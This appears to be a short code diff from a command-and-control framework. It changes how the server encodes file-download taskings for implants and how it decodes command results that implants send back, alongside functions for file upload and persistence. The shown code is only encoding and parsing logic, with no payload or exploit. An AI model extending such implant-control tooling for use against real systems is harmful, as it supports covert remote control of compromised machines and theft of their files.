@@ -33,7 +33,9 @@ def craft_file_upload(value_dict, command_id):
 
 
 def craft_file_download(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
+    encoded_target_file = base64.b64encode(value_dict['args'].encode()).decode()
+    to_return = f"{value_dict['type']}{command_id}{encoded_target_file}"
+    return str(to_return)
 
 
 def craft_enable_persistence(value_dict, command_id):
@@ -134,9 +136,8 @@ def implant_command_result():
 
         command_id = decoded_response_stream_data[0:24]
         encoded_command = decoded_response_stream_data[24:]
-        decoded_response = base64.b64decode(encoded_command+"==").decode()
-
-        Imp.command_response(request.headers['X-Result'], command_id, decoded_response, app.config['listener_type'])
+        decoded_response = base64.b64decode(f"{encoded_command}==")
+        Imp.command_response(command_id, decoded_response, app.config['listener_type'])
     return "=="
 
 
